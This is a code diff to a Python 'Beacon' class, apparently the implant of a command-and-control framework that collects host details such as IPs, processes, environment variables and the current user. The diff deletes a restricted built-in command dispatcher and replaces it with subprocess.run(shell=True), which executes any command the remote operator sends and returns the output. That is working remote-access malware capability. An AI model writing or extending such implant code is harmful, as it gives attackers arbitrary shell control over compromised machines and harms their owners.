@@ -5,9 +5,9 @@ import socket
 import os
 import platform
 import shutil
-import shlex
 import struct
 import getpass
+import subprocess
 from pathlib import Path
 from typing import Callable, Dict, List, Tuple
 
@@ -649,7 +649,6 @@ class Beacon:
         self.taskResults: List[Dict[str, object]] = []
 
         self._instruction_handlers: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}
-        self._native_run_dispatch: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}
 
         self.beaconHash = ''.join(random.choice(CHARACTER_POOL) for _ in range(32))
 
@@ -668,7 +667,6 @@ class Beacon:
         self.xorKey = ""
 
         self._register_instruction_handlers()
-        self._initialize_run_dispatch()
 
 
     def set_xor_key(self, key: str) -> None:
@@ -706,25 +704,6 @@ class Beacon:
         }
 
         self._instruction_handlers = handlers
-
-    def _initialize_run_dispatch(self) -> None:
-        self._native_run_dispatch = {
-            "ls": self._handle_list_directory,
-            "dir": self._handle_list_directory,
-            "pwd": self._handle_pwd,
-            "cat": self._handle_cat,
-            "cd": self._handle_change_directory,
-            "mkdir": self._handle_mkdir,
-            "rm": self._handle_remove,
-            "remove": self._handle_remove,
-            "tree": self._handle_tree,
-            "ps": self._handle_list_processes,
-            "listprocesses": self._handle_list_processes,
-            "whoami": self._handle_whoami,
-            "netstat": self._handle_netstat,
-            "ipconfig": self._handle_ipconfig,
-            "getenv": self._handle_getenv,
-        }
 
     def _collect_internal_ips(self) -> str:
         ips: List[str] = []
@@ -1043,34 +1022,22 @@ class Beacon:
     def _handle_pwd(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return (os.getcwd(), b"")
 
-    def _execute_native_command(self, command: str) -> Tuple[str, bytes]:
-        try:
-            parts = shlex.split(command)
-        except Exception as exc:
-            return (f"Failed to parse command: {exc}", b"")
-
-        if not parts:
-            return (DEFAULT_EMPTY_RESPONSE, b"")
-
-        name = parts[0].lower()
-        arguments = parts[1:]
-
-        handler = self._native_run_dispatch.get(name)
-        if handler:
-            cmd_arg = arguments[0] if arguments else ""
-            remaining_args = " ".join(arguments[1:]) if len(arguments) > 1 else ""
-            return handler(cmd_arg, remaining_args, b"", "", "", -1)
-
-        if name == "echo":
-            return (" ".join(arguments), b"")
-
-        return (f"Unsupported command: {name}", b"")
-
     def _handle_run(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         command = cmd or args
         if not command:
             return (DEFAULT_EMPTY_RESPONSE, b"")
-        return self._execute_native_command(command)
+        try:
+            completed = subprocess.run(
+                command,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                timeout=60,
+            )
+            output = completed.stdout.decode("utf-8", errors="ignore")
+            return (output or DEFAULT_EMPTY_RESPONSE, b"")
+        except Exception as exc:
+            return (f"Failed to execute command: {exc}", b"")
 
     def _handle_shell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return self._handle_run(cmd, args, data, input_file, output_file, pid)
